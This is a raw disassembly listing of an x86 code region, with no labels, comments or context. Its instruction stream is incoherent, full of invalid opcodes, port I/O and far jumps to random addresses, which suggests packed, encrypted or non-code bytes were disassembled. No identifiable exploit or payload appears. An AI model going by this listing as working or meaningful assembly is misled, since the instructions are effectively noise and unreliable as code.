  40c17d:	xlat   BYTE PTR ds:[ebx]
  40c17e:	sbb    BYTE PTR [edi-0xcd1a36],bl
  40c184:	ret    
  40c185:	(bad)  
  40c187:	sub    ebx,DWORD PTR [ebp-0x100ce012]
  40c18d:	jle    0x40c1f0
  40c18f:	test   DWORD PTR [ecx+0x32],esp
  40c192:	cmpps  xmm4,XMMWORD PTR [ebx-0x690671ae],0x87
  40c19a:	add    al,0xdf
  40c19c:	stc    
  40c19d:	xchg   edi,eax
  40c19e:	out    dx,al
  40c19f:	popa   
  40c1a0:	cmp    BYTE PTR [esi+ecx*4],bl
  40c1a3:	call   0x41fbb0a3
  40c1a8:	push   ss
  40c1a9:	stc    
  40c1aa:	(bad)  
  40c1ab:	sbb    eax,0xebd4870e
  40c1b0:	jne    0x40c1dc
  40c1b2:	xchg   ebp,eax
  40c1b3:	or     bh,bh
  40c1b5:	fucomip st,st(7)
  40c1b7:	jle    0x40c13a
  40c1b9:	daa    
  40c1ba:	lahf   
  40c1bb:	outs   dx,DWORD PTR ds:[esi]
  40c1bc:	rcr    DWORD PTR [eax],1
  40c1be:	mov    ebx,0x279529b
  40c1c3:	aas    
  40c1c4:	sbb    BYTE PTR [ebx],ah
  40c1c6:	mov    al,BYTE PTR [eax+0x8]
  40c1c9:	xor    ecx,DWORD PTR [edi+0x7b7d435f]
  40c1cf:	or     eax,0x64530961
  40c1d4:	je     0x40c1d3
  40c1d6:	xor    al,0x60
  40c1d8:	(bad)  
  40c1d9:	jge    0x40c216
  40c1db:	inc    ebp
  40c1dc:	pushf  
  40c1dd:	xchg   BYTE PTR [ecx-0x141db60],cl
  40c1e3:	mov    eax,0xf3cd9896
  40c1e8:	push   ss
  40c1e9:	sbb    BYTE PTR [edi-0x52fe2bb9],ah
  40c1ef:	push   esi
  40c1f0:	or     BYTE PTR [ebx-0x5b6416e6],ah
  40c1f6:	and    edi,DWORD PTR ds:0xe776f10d
  40c1fc:	add    DWORD PTR [ecx+edx*4-0xe],eax
  40c200:	push   es
  40c201:	or     al,0x87
  40c203:	add    ecx,DWORD PTR [esi]
  40c205:	cs dec ebp
  40c207:	push   edx
  40c208:	cs xchg edi,eax
  40c20a:	dec    eax
  40c20b:	pop    edx
  40c20c:	std    
  40c20d:	int3   
  40c20e:	aaa    
  40c20f:	jo     0x40c1fa
  40c211:	ret    0x6df4
  40c214:	inc    ecx
  40c215:	cmp    esi,ebx
  40c217:	jge    0x40c1f8
  40c219:	idiv   DWORD PTR [ebp-0x49]
  40c21c:	jl     0x40c23c
  40c21e:	add    ah,bl
  40c220:	les    esi,FWORD PTR [eax+eiz*2-0x2d]
  40c224:	repnz or al,0x41
  40c227:	ins    DWORD PTR es:[edi],dx
  40c228:	xor    esp,ecx
  40c22a:	mov    edi,0x2c8f3b64
  40c22f:	loope  0x40c1ea
  40c231:	nop
  40c232:	call   0xce40669d
  40c237:	dec    eax
  40c238:	cld    
  40c239:	popf   
  40c23a:	ins    BYTE PTR es:[edi],dx
  40c23b:	add    DWORD PTR [esi-0x2e54ec11],edi
  40c241:	push   0x92913f89
  40c246:	mov    dl,0xef
  40c248:	adc    eax,DWORD PTR [esi+edi*1]
  40c24b:	xchg   edi,eax
  40c24c:	cs scas eax,DWORD PTR es:[edi]
  40c24e:	adc    esi,edi
  40c250:	add    eax,0x31ca3554
  40c255:	out    dx,eax
  40c256:	sub    al,0x35
  40c258:	add    edx,DWORD PTR [eax+0x1e6b4129]
  40c25e:	loop   0x40c2a8
  40c260:	jg     0x40c267
  40c262:	adc    dh,BYTE PTR [ebx]
  40c264:	or     al,0x81
  40c266:	hlt    
  40c267:	js     0x40c295
  40c269:	push   ecx
  40c26a:	cdq    
  40c26b:	arpl   WORD PTR [ebx+0x10],sp
  40c26e:	add    BYTE PTR [ebx+edi*2+0x6],0xa4
  40c273:	push   esp
  40c274:	add    edi,DWORD PTR [ecx]
  40c276:	or     BYTE PTR [esp+edi*4],bh
  40c279:	test   al,0x49
  40c27b:	mov    ebx,0xf0ff887f
  40c280:	dec    ebx
  40c281:	out    0xd9,eax
  40c283:	fdiv   st(2),st
  40c285:	adc    eax,0xfeffc1fe
  40c28a:	adc    DWORD PTR [esi+0x66],esp
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	ins    DWORD PTR es:[edi],dx
  40c28f:	adc    BYTE PTR [ebp-0x42],0x9f
  40c293:	mov    esp,DWORD PTR [eax]
  40c295:	jns    0x40c315
  40c297:	jnp    0x40c248
  40c299:	xlat   BYTE PTR ds:[ebx]
  40c29a:	mov    ds:0x37f0a952,eax
  40c29f:	(bad)  
  40c2a0:	cli    
  40c2a1:	fstp   TBYTE PTR [ecx-0x3f80546]
  40c2a7:	cli    
  40c2a8:	out    dx,eax
  40c2a9:	ins    DWORD PTR es:[edi],dx
  40c2aa:	adc    ecx,ecx
  40c2ac:	jno    0x40c23c
  40c2ae:	fcom   QWORD PTR [ecx+0x3eeff1f0]
  40c2b4:	test   bh,ch
  40c2b6:	sti    
  40c2b7:	je     0x40c274
  40c2b9:	(bad)  
  40c2bb:	ja     0x40c334
  40c2bd:	adc    DWORD PTR [eax+0x54798ef9],eax
  40c2c3:	pusha  
  40c2c4:	cwde   
  40c2c5:	shl    ah,cl
  40c2c7:	hlt    
  40c2c8:	xor    al,0x2f
  40c2ca:	sbb    al,0x3b
  40c2cc:	lds    esp,FWORD PTR [edi+0x618c733f]
  40c2d2:	mov    esp,0x1a7944c0
  40c2d7:	iret   
  40c2d8:	outs   dx,DWORD PTR ds:[esi]
  40c2d9:	and    dl,BYTE PTR [ebx]
  40c2db:	pop    edi
  40c2dc:	dec    ebx
  40c2dd:	(bad)  
  40c2de:	cld    
  40c2df:	cwde   
  40c2e0:	mov    dl,0x77
  40c2e2:	shl    DWORD PTR [eax-0x5e6d9eff],0xa
  40c2e9:	push   eax
  40c2ea:	adc    DWORD PTR [edx+0x6],edi
  40c2ed:	rol    BYTE PTR [ebx-0x6ae7dd15],cl
  40c2f3:	or     eax,0x4f5718e6
  40c2f8:	adc    BYTE PTR [ecx],ch
  40c2fa:	jae    0x40c2c4
  40c2fc:	xor    DWORD PTR [edx+0x6e409b51],eax
  40c302:	fisttp DWORD PTR [esi]
  40c304:	mov    dl,0x47
  40c306:	pop    edx
  40c307:	jmp    0x40c2c8
  40c309:	jb     0x40c366
  40c30b:	xchg   BYTE PTR [ecx],ah
  40c30d:	and    al,0x71
  40c30f:	(bad)
  40c313:	xchg   BYTE PTR [ebp-0x1ee4ee78],bh
  40c319:	pop    ecx
  40c31a:	fs xor edx,ecx
  40c31d:	in     eax,dx
  40c31e:	je     0x40c311
  40c320:	fnstsw WORD PTR [esi+0x11a6edf1]
  40c326:	sbb    dh,0xa
  40c329:	jp     0x40c2db
  40c32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c32c:	sti    
  40c32d:	mov    bl,0x89
  40c32f:	and    ch,bl
  40c331:	add    BYTE PTR [edi-0x42811ec4],al
  40c337:	xchg   esi,eax
  40c338:	std    
  40c339:	fwait
  40c33a:	xchg   ecx,eax
  40c33b:	clc    
  40c33c:	inc    ebp
  40c33d:	push   0x40
  40c33f:	cmp    BYTE PTR [edx+ebp*2],bl
  40c342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c343:	das    
  40c344:	mov    ch,0x64
  40c346:	push   edi
  40c347:	stc    
  40c348:	jmp    0xf9b15c5f
  40c34d:	bnd ss ret 0x5b2b
  40c352:	xchg   edi,eax
  40c353:	push   ecx
  40c354:	jp     0x40c2f3
  40c356:	sub    al,0x8c
  40c358:	xchg   DWORD PTR [edx+esi*1],esi
  40c35b:	or     al,0x2b
  40c35d:	and    DWORD PTR [edx+0xa4180aa],esi
  40c363:	jns    0x40c389
  40c365:	pusha  
  40c366:	cbw    
  40c368:	dec    ecx
  40c369:	dec    ecx
  40c36a:	call   0x15ed:0x1208505a
  40c371:	lock cmp eax,0x91042f81
  40c377:	push   edi
  40c378:	data16 adc bh,ch
  40c37b:	out    0xd7,eax
  40c37d:	jg     0x40c37a
  40c37f:	and    ch,BYTE PTR [ebp-0x700ed00a]
  40c385:	inc    cl
  40c387:	div    DWORD PTR [eax+0x7e816fb4]
  40c38d:	mov    edi,0x6370536f
  40c392:	out    dx,eax
  40c393:	pop    ebx
  40c394:	dec    esp
  40c395:	hlt    
  40c396:	jns    0x40c380
  40c398:	outs   dx,BYTE PTR ds:[esi]
  40c399:	cwde   
  40c39a:	ror    BYTE PTR [edi],0xfd
  40c39d:	int    0x6f
  40c39f:	gs ins DWORD PTR es:[edi],dx
  40c3a1:	jecxz  0x40c396
  40c3a3:	cmp    al,0xfa
  40c3a5:	je     0x40c369
  40c3a7:	mov    ebx,0x3cf3ade
  40c3ac:	imul   edi
  40c3ae:	aad    0xc9
  40c3b0:	pop    esi
  40c3b1:	mov    bl,0xd2
  40c3b3:	fisttp QWORD PTR [ebp+0xd49dc3e]
  40c3b9:	sbb    BYTE PTR [esi],cl
  40c3bb:	xchg   esp,ecx
  40c3bd:	into   
  40c3be:	into   
  40c3bf:	shr    BYTE PTR [edx+0x75],cl
  40c3c2:	stc    
  40c3c3:	test   DWORD PTR [edi-0x3],ebx
  40c3c6:	xor    ah,BYTE PTR [edi+0x2e]
  40c3c9:	xchg   esp,eax
  40c3ca:	cdq    
  40c3cb:	pop    ebp
  40c3cc:	cwde   
  40c3cd:	lds    ebp,FWORD PTR [edi]
  40c3cf:	lea    eax,[ecx-0x1c65758]
  40c3d5:	mov    cl,0x9
  40c3d7:	sbb    eax,0x242644d7
  40c3dc:	xor    dl,BYTE PTR [ecx+0x63356e78]
  40c3e2:	(bad)  [ecx-0x12243daa]
  40c3e8:	(bad)  
  40c3e9:	jmp    0x6762:0x564caa9f
  40c3f0:	adc    bl,BYTE PTR [ecx+ecx*2]
  40c3f3:	in     al,dx
  40c3f4:	ins    BYTE PTR es:[edi],dx
  40c3f5:	inc    eax
  40c3f6:	push   edi
  40c3f7:	rcr    BYTE PTR [ebx-0x1f],0x94
  40c3fb:	and    eax,0xe22651fa
  40c400:	sbb    dl,BYTE PTR ds:0x6100ee65
  40c406:	mov    edi,0x890065af
  40c40b:	and    al,0x4e
  40c40d:	cmp    al,0x3c
  40c40f:	jp     0x40c465
  40c411:	dec    ebx
  40c412:	cmp    eax,0xea2c006b
  40c417:	stos   DWORD PTR es:[edi],eax
  40c418:	jmp    0x40c43a
  40c41a:	fistp  DWORD PTR [ebx+0x5a]
  40c41d:	or     eax,eax
  40c41f:	ins    DWORD PTR es:[edi],dx
  40c420:	mov    ebx,0x43e90042
  40c425:	daa    
  40c426:	cmp    dl,BYTE PTR [ecx+esi*1+0x2d39e65b]
  40c42d:	cld    
  40c42e:	xchg   ecx,eax
  40c42f:	jb     0x40c3ea
  40c431:	jb     0x40c3ec
  40c433:	adc    BYTE PTR [eax],0x8c
  40c436:	les    ecx,FWORD PTR [ebp-0x88f2911]
  40c43c:	cmc    
  40c43d:	sub    al,0x5f
  40c43f:	out    dx,eax
  40c440:	cmp    BYTE PTR [ebx-0x4160a7fe],ah
  40c446:	xchg   esp,eax
  40c447:	push   esp
  40c448:	sub    dl,BYTE PTR ds:0xf9623892
  40c44e:	in     al,dx
  40c44f:	push   ss
  40c450:	xchg   edx,eax
  40c451:	data16 stos BYTE PTR es:[edi],al
  40c453:	inc    ebx
  40c454:	mov    dh,ah
  40c456:	jp     0x40c3e1
  40c458:	xchg   ebx,eax
  40c459:	add    al,0xd5
  40c45b:	or     al,0x6
  40c45d:	fwait
  40c45e:	sbb    al,0xcc
  40c460:	adc    BYTE PTR gs:[esi],cl
  40c463:	add    cl,BYTE PTR [eax+0x5]
  40c466:	mov    edi,0x55129ebb
  40c46b:	add    BYTE PTR [edx+0x52],0x9
  40c46f:	sbb    ah,dh
  40c471:	push   0xffffffc3
  40c473:	xchg   edi,eax
  40c474:	out    dx,eax
  40c475:	sbb    DWORD PTR [edi],0x7b
  40c478:	and    al,0x9
  40c47a:	test   cl,cl
  40c47c:	adc    bh,BYTE PTR [edi-0x49ea2609]
  40c482:	mov    dh,0xff
  40c484:	adc    edi,DWORD PTR [edi]
  40c486:	cli    
  40c487:	leave  
  40c488:	out    dx,eax
  40c489:	loope  0x40c439
  40c48b:	mov    ebx,0xb76ed00e
  40c490:	inc    edi
  40c491:	cwde   
  40c492:	inc    eax
  40c493:	cli    
  40c494:	pop    esp
  40c495:	imul   esp,esp,0x3ca1e63
  40c49b:	je     0x40c458
  40c49d:	pop    ebp
  40c49e:	jmp    0xde37:0xf43f0af5
  40c4a5:	enter  0x47b3,0x2f
  40c4a9:	jno    0x40c48f
  40c4ab:	scas   al,BYTE PTR es:[edi]
  40c4ac:	cmp    eax,0xc2c3870c
  40c4b1:	jns    0x40c4b1
  40c4b3:	inc    ebp
  40c4b4:	int3   
  40c4b5:	les    edi,FWORD PTR [ebp-0x5fcf9f02]
  40c4bb:	pop    esi
  40c4bc:	scas   eax,DWORD PTR es:[edi]
  40c4bd:	shr    DWORD PTR [esi+esi*1-0x7],cl
  40c4c1:	aad    0x5f
  40c4c3:	inc    DWORD PTR [edx]
  40c4c5:	jg     0x40c4b9
  40c4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c8:	imul   edx,DWORD PTR [eax-0x46],0x13
  40c4cc:	iret   
  40c4cd:	fwait
  40c4ce:	add    BYTE PTR [edi+0x48668ba1],bh
  40c4d4:	test   dh,dh
  40c4d6:	out    dx,eax
  40c4d7:	in     eax,0x89
  40c4d9:	xor    edx,DWORD PTR [ecx]
  40c4db:	xchg   cl,ah
  40c4dd:	cmp    BYTE PTR [ecx+ebp*2-0x7def8c02],al
  40c4e4:	popf   
  40c4e5:	cmc    
  40c4e6:	xchg   edi,eax
  40c4e7:	xor    DWORD PTR [edx],edi
  40c4e9:	dec    ebx
  40c4ea:	xor    eax,0xf4eac1d5
  40c4ef:	cli    
  40c4f0:	(bad)  
  40c4f1:	dec    edx
  40c4f2:	jge    0x40c50b
  40c4f4:	or     esp,esp
  40c4f6:	or     eax,DWORD PTR [ecx-0x2c7dd9e8]
  40c4fc:	push   edx
  40c4fd:	push   es
  40c4fe:	xor    DWORD PTR [edx],esi
  40c500:	pop    esp
  40c501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c502:	popa   
  40c503:	bnd ret 0x609
  40c507:	xchg   edx,eax
  40c508:	test   BYTE PTR [ecx-0x6771a55c],dl
  40c50e:	lahf   
  40c50f:	lods   eax,DWORD PTR ds:[esi]
  40c510:	(bad)  
  40c511:	aam    0xc3
  40c513:	push   esp
  40c514:	xlat   BYTE PTR ds:[ebx]
  40c515:	dec    ecx
  40c516:	push   ebp
  40c517:	add    BYTE PTR [ebx],dh
  40c519:	xadd   BYTE PTR ds:0x9c714292,dl
  40c520:	outs   dx,BYTE PTR gs:[esi]
  40c522:	push   ebx
  40c523:	(bad)  [ebp+0x1c]
  40c526:	inc    eax
  40c527:	out    0xe4,al
  40c529:	and    BYTE PTR [ebx],bl
  40c52b:	jmp    0xaa482bd7
  40c530:	psraw  mm4,QWORD PTR [edx]
  40c533:	push   es
  40c534:	and    esp,edi
  40c536:	ret    0xe050
  40c539:	jmp    0x40c55c
  40c53b:	sbb    BYTE PTR [ebx-0x165089a3],0x3e
  40c542:	jnp    0x40c515
  40c544:	ds xor al,0x3
  40c547:	test   al,0x54
  40c549:	sub    bl,BYTE PTR [ecx]
  40c54b:	cs pop ebp
  40c54d:	scas   eax,DWORD PTR es:[edi]
  40c54e:	xlat   BYTE PTR ds:[ebx]
  40c54f:	jmp    0x72fd4149
  40c554:	push   0x1b
  40c556:	les    esi,FWORD PTR [esi+ebx*4]
  40c559:	xchg   BYTE PTR [ebp-0x39abc2a6],bl
  40c55f:	sbb    eax,0xd9fc6661
  40c564:	dec    ebx
  40c565:	test   eax,0xe7f10e9d
  40c56a:	popa   
  40c56b:	mov    edi,0xddcc088b
  40c570:	adc    al,BYTE PTR [edi+0x426fd490]
  40c576:	and    al,BYTE PTR ds:0x2a7c19d2
  40c57c:	or     DWORD PTR [ecx-0x33bec817],ebp
  40c582:	add    bl,BYTE PTR [edi-0x4]
  40c585:	jmp    0x1aff:0xfdefe55
  40c58c:	jmp    edx
  40c58e:	lahf   
  40c58f:	jge    0x40c5c8
  40c591:	neg    DWORD PTR [ecx+edi*1]
  40c594:	inc    esp
  40c595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c596:	shl    DWORD PTR [ecx-0x54a324ee],cl
  40c59c:	sub    BYTE PTR [edi+edx*8-0x14],ah
  40c5a0:	ja     0x40c531
  40c5a2:	lea    esp,[edx-0x6c423a78]
  40c5a8:	sub    al,0xee
  40c5aa:	popf   
  40c5ab:	xor    BYTE PTR fs:[eax],bl
  40c5ae:	fs jb  0x40c5e9
  40c5b1:	out    0x99,al
  40c5b3:	inc    esi
  40c5b4:	shl    DWORD PTR [esi-0x40],1
  40c5b7:	xor    cl,BYTE PTR [ecx+ebx*8+0x799e59d9]
  40c5be:	out    dx,al
  40c5bf:	add    al,0xbf
  40c5c1:	repnz pop edi
  40c5c3:	sahf   
  40c5c4:	arpl   WORD PTR [ebx-0xb1b36cd],si
  40c5ca:	cmp    BYTE PTR [ecx],cl
  40c5cc:	xor    eax,0x461050e2
  40c5d1:	or     DWORD PTR [ecx+0x20],eax
  40c5d4:	nop
  40c5d5:	mov    cl,0xa3
  40c5d7:	dec    esi
  40c5d8:	mov    ecx,0xb10c2dd4
  40c5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5de:	push   0xffffff80
  40c5e0:	fisubr DWORD PTR [esp+ebx*1]
  40c5e3:	ret    0x7616
  40c5e6:	jg     0x40c5f2
  40c5e8:	ror    DWORD PTR ds:0xb6a572a3,cl
  40c5ee:	mov    ecx,0xf6031ea0
  40c5f3:	jb     0x40c58b
  40c5f5:	sub    ebp,DWORD PTR [ebx-0x77c4df40]
  40c5fb:	add    eax,0xb6c8ba29
  40c600:	hlt    
  40c601:	cdq    
  40c602:	shr    bl,cl
  40c604:	stos   BYTE PTR es:[edi],al
  40c605:	jp     0x40c597
  40c607:	xor    dl,ch
  40c609:	inc    DWORD PTR [ebx+0x49]
  40c60c:	sbb    BYTE PTR [esi],ah
  40c60e:	mov    WORD PTR [edi+0x12],ss
  40c611:	test   dh,0x4f
  40c614:	adc    DWORD PTR [esi-0x1f],eax
  40c617:	mov    BYTE PTR [edx],cl
  40c619:	pusha  
  40c61a:	pop    edx
  40c61b:	mov    ecx,0x7373665c
  40c620:	xor    eax,ebx
  40c622:	add    ah,dh
  40c624:	cmp    BYTE PTR ds:0x1321b70,bl
  40c62a:	cdq    
  40c62b:	mov    dh,0x1b
  40c62d:	add    al,0xe0
  40c62f:	dec    ecx
  40c630:	test   eax,0x41063792
  40c635:	mov    al,ds:0x33f9bf25
  40c63a:	int    0xe5
  40c63c:	(bad)  
  40c63d:	jmp    0x5a5dfb89
  40c642:	adc    al,0x25
  40c644:	out    0xb6,al
  40c646:	pop    ebx
  40c647:	add    eax,0xcfb5aff5
  40c64c:	popf   
  40c64d:	shr    BYTE PTR [edx],cl
  40c64f:	sbb    al,0xa2
  40c651:	sub    al,0x57
  40c653:	sub    ebp,DWORD PTR [esi+ebp*4+0x2dbdb1ae]
  40c65a:	pushf  
  40c65b:	add    DWORD PTR [edi+0x3892673e],edx
  40c661:	nop
  40c662:	shl    BYTE PTR ds:0xe91e9904,1
  40c668:	es or  cl,cl
  40c66b:	inc    edx
  40c66c:	jg     0x40c695
  40c66e:	and    BYTE PTR [eax+0x64],cl
  40c671:	aad    0x2
  40c673:	jne    0x40c613
  40c675:	mov    DWORD PTR [ecx],ecx
  40c677:	sar    BYTE PTR [ecx+0x3],1
  40c67a:	sar    BYTE PTR [ecx+0x8],1
  40c67d:	test   DWORD PTR [edx],esi
  40c67f:	mov    ch,BYTE PTR [ecx-0x6776fabd]
  40c685:	jecxz  0x40c638
  40c687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c688:	xlat   BYTE PTR ds:[ebx]
  40c689:	clc    
  40c68a:	loope  0x40c70b
  40c68c:	clc    
  40c68d:	sub    DWORD PTR [esi-0x16],edi
  40c690:	pop    edi
  40c691:	jge    0x40c617
  40c693:	cmp    ecx,DWORD PTR [esi]
  40c695:	in     eax,dx
  40c696:	arpl   WORD PTR [ebx+0x7b],di
  40c699:	cmp    esp,DWORD PTR [ebx+0x5d]
  40c69c:	into   
  40c69d:	xor    eax,DWORD PTR [eax]
  40c69f:	ja     0x40c687
  40c6a1:	pop    ecx
  40c6a2:	push   ds
  40c6a3:	rcr    BYTE PTR [ebx+0x113b23e4],cl
  40c6a9:	jp     0x40c67c
  40c6ab:	fadd   QWORD PTR [edi+esi*4]
  40c6ae:	jg     0x40c6b7
  40c6b0:	add    DWORD PTR [ecx],0x73
  40c6b3:	jae    0x40c728
  40c6b5:	mov    ah,0x3b
  40c6b7:	cmp    eax,0xfe5fdffe
  40c6bc:	xor    ah,BYTE PTR [edi-0x1a07fa32]
  40c6c2:	sbb    eax,esi
  40c6c4:	(bad)  
  40c6c5:	xchg   ecx,eax
  40c6c6:	push   esp
  40c6c7:	mov    BYTE PTR [edx+0x55],ah
  40c6ca:	inc    esi
  40c6cb:	cmp    al,0x8e
  40c6cd:	xchg   ebp,eax
  40c6ce:	mov    al,ds:0x6ec42390
  40c6d3:	(bad)  
  40c6d4:	mov    ebp,DWORD PTR [ebx-0x80]
  40c6d7:	jae    0x40c6fa
  40c6d9:	mov    esi,0x5e5c5833
  40c6de:	xor    BYTE PTR [edx-0x42],dh
  40c6e1:	jnp    0x40c673
  40c6e3:	mov    ah,0x8b
  40c6e5:	pop    ecx
  40c6e6:	push   ebp
  40c6e7:	inc    edx
  40c6e8:	jg     0x40c705
  40c6ea:	out    0xfb,eax
  40c6ec:	pop    ecx
  40c6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ee:	sub    BYTE PTR [ebx],0xf0
  40c6f1:	shl    BYTE PTR [ecx],cl
  40c6f3:	loope  0x40c72e
  40c6f5:	enter  0x7cc4,0x53
  40c6f9:	push   ebp
  40c6fa:	or     eax,eax
  40c6fc:	dec    esp
  40c6fd:	cmp    dl,BYTE PTR [edx-0x3a]
  40c700:	rcl    BYTE PTR [edx+0x200fc7d7],0xec
  40c707:	lea    edx,[esi+0x3]
  40c70a:	xor    bh,ch
  40c70c:	jmp    0xd18fc60c
  40c711:	popf   
  40c712:	sbb    eax,0xc768a560
  40c717:	lods   eax,DWORD PTR ds:[esi]
  40c718:	push   0x4d0061bb
  40c71d:	ret    
  40c71e:	add    BYTE PTR [edi+edi*4+0x64],bh
  40c722:	cmp    DWORD PTR [edi+0x84250f9],esi
  40c728:	sbb    eax,0xfff5980d
  40c72d:	pop    ss
  40c72e:	jmp    0x8e37c0c2
  40c733:	test   dl,bh
  40c735:	cmp    ebx,DWORD PTR [ebp+0x77]
  40c738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c739:	repz bound ebx,QWORD PTR [ebp-0x1d]
  40c73d:	sar    ah,0x49
  40c740:	test   eax,0x6ab54f0c
  40c745:	xchg   ebp,eax
  40c746:	adc    esp,DWORD PTR [edi]
  40c748:	ss push 0x82564bb5
  40c74e:	fadd   DWORD PTR [ecx]
  40c750:	fs call 0xf3118a94
  40c756:	dec    eax
  40c757:	and    BYTE PTR [ebx-0x8],cl
  40c75a:	xchg   esi,eax
  40c75b:	loopne 0x40c77e
  40c75d:	mov    ebx,0xb7cee49c
  40c762:	int3   
  40c763:	inc    eax
  40c764:	and    al,BYTE PTR [ebp-0x76ef5719]
  40c76a:	cs push cs
  40c76c:	in     al,0x4a
  40c76e:	adc    al,0xf
  40c770:	sub    esi,esi
  40c772:	lock mov ch,0x67
  40c775:	loope  0x40c7be
  40c777:	ds stc 
  40c779:	sub    DWORD PTR [esi-0x6],edi
  40c77c:	(bad)  
  40c77d:	aas    
  40c77e:	into   
  40c77f:	fsub   st(4),st
  40c781:	xor    al,0x1b
  40c783:	sbb    ebx,DWORD PTR [ebx]
  40c785:	push   0xffffffaf
  40c787:	out    0x8d,eax
  40c789:	pop    eax
  40c78a:	lock repz push edx
  40c78d:	mov    ebx,0xd7702548
  40c792:	mov    esp,DWORD PTR [eax-0x3ff0c442]
  40c798:	xor    BYTE PTR [ecx],cl
  40c79a:	arpl   bp,si
  40c79c:	lahf   
  40c79d:	cwde   
  40c79e:	cwde   
  40c79f:	loopne 0x40c7b8
  40c7a1:	jg     0x40c788
  40c7a3:	or     edi,DWORD PTR [esi+edi*8-0x35]
  40c7a7:	push   edi
  40c7a8:	or     DWORD PTR [ebx+0x24d13c25],edx
  40c7ae:	mov    eax,ds:0x262389aa
  40c7b3:	mov    es,WORD PTR [ebp+0x5217b58a]
  40c7b9:	sti    
  40c7ba:	sti    
  40c7bb:	sbb    eax,0x6cf5aec9
  40c7c0:	xchg   ecx,eax
  40c7c1:	leave  
  40c7c2:	mov    edx,0xedcfc963
  40c7c7:	jp     0x40c7b0
  40c7c9:	js     0x40c812
  40c7cb:	mov    edx,0xc920461b
  40c7d0:	xor    DWORD PTR [eax],edx
  40c7d2:	out    0x72,eax
  40c7d4:	xchg   esi,eax
  40c7d5:	xchg   BYTE PTR ds:0xd31748b3,dh
  40c7db:	imul   eax,DWORD PTR [edx],0x45
  40c7de:	inc    esi
  40c7df:	rol    DWORD PTR [esp+edi*8+0x2e761278],0x48
  40c7e7:	ins    BYTE PTR es:[edi],dx
  40c7e8:	rol    BYTE PTR [ecx-0x721cf63b],cl
  40c7ee:	sbb    BYTE PTR [edi+0x24bdbc98],cl
  40c7f4:	outs   dx,DWORD PTR ds:[esi]
  40c7f5:	mov    ds:0xe829ebe9,eax
  40c7fa:	jmp    0x4db8:0x17baf67e
  40c801:	cs inc eax
  40c803:	mov    eax,0xa4202309
  40c808:	leave  
  40c809:	cmp    eax,0x668091b3
  40c80e:	neg    BYTE PTR [edi-0x251b2665]
  40c814:	pop    ecx
  40c815:	sub    DWORD PTR [edi-0x7b],0x692d7fbe
  40c81c:	lahf   
  40c81d:	pop    edi
  40c81e:	idiv   DWORD PTR [edi+ecx*4]
  40c821:	sahf   
  40c822:	push   cs
  40c823:	scas   eax,DWORD PTR es:[edi]
  40c824:	xchg   ebp,eax
  40c825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c826:	push   eax
  40c827:	(bad)  
  40c829:	mov    DWORD PTR [edx],ebp
  40c82b:	iret   
  40c82c:	sahf   
  40c82d:	pop    ebp
  40c82e:	mov    eax,ds:0x40652ad3
  40c833:	mov    es,eax
  40c835:	or     edi,edi
  40c837:	int    0x41
  40c839:	(bad)  
  40c83a:	in     al,dx
  40c83b:	mov    dh,0x3c
  40c83d:	shr    DWORD PTR [ebx-0x1b156aff],1
  40c843:	ret    0x2739
  40c846:	inc    ebp
  40c847:	push   cs
  40c848:	jbe    0x40c823
  40c84a:	xor    BYTE PTR [ecx+eiz*2],ah
  40c84d:	push   eax
  40c84e:	add    BYTE PTR [eax],cl
  40c850:	mov    eax,ds:0xb48c8098
  40c855:	retf   
  40c856:	push   eax
  40c857:	pop    edi
  40c858:	xor    esp,DWORD PTR [ecx-0x7a]
  40c85b:	das    
  40c85c:	aas    
  40c85d:	jbe    0x40c7f4
  40c85f:	pop    ds
  40c860:	stc    
  40c861:	in     al,0x7f
  40c863:	loope  0x40c82c
  40c865:	jg     0x40c853
  40c867:	arpl   WORD PTR [ebx+ebx*4],si
  40c86a:	dec    ebp
  40c86b:	mov    dh,0xb6
  40c86d:	mov    dh,0x9c
  40c86f:	jnp    0x40c85e
  40c871:	lods   al,BYTE PTR ds:[esi]
  40c872:	mov    bh,0x17
  40c874:	mov    eax,ds:0xbcbefc83
  40c879:	and    eax,edx
  40c87b:	adc    BYTE PTR [edi-0x71dfd8c5],bh
  40c881:	arpl   si,si
  40c883:	in     al,dx
  40c884:	fld    st(3)
  40c886:	repz inc edi
  40c888:	iret   
  40c889:	lock test eax,0xd5a31f4f
  40c88f:	popf   
  40c890:	les    ebp,FWORD PTR [ebx]
  40c892:	dec    edi
  40c893:	and    al,BYTE PTR [ebp-0x7d]
  40c896:	and    al,0x11
  40c898:	test   BYTE PTR [ecx+0x44],dl
  40c89b:	adc    al,0x79
  40c89d:	inc    esp
  40c89e:	push   ecx
  40c89f:	inc    edx
  40c8a0:	sbb    BYTE PTR [ecx+0x84f7f20],ch
  40c8a6:	lock int3 
  40c8a8:	test   DWORD PTR [eax+0x25],0x197efdbd
  40c8af:	pop    ebx
  40c8b0:	and    BYTE PTR [edx+0x36],0xe
  40c8b4:	(bad)  
  40c8b6:	out    dx,eax
  40c8b7:	out    0xd9,al
  40c8b9:	arpl   WORD PTR [ecx],sp
  40c8bb:	popf   
  40c8bc:	aad    0x58
  40c8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8bf:	dec    edx
  40c8c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8c1:	ret    0x65ca
  40c8c4:	push   cs
  40c8c5:	inc    ebp
  40c8c6:	enter  0x6d40,0x1f
  40c8ca:	cmc    
  40c8cb:	push   esp
  40c8cc:	fs xchg ecx,eax
  40c8ce:	mov    al,ds:0xeaa404ca
  40c8d3:	add    DWORD PTR [edx+0x41834489],ebp
  40c8d9:	int3   
  40c8da:	mov    eax,ds:0x2a546303
  40c8df:	and    eax,0xb9fbb6b6
  40c8e4:	jecxz  0x40c939
  40c8e6:	aad    0x38
  40c8e8:	dec    ecx
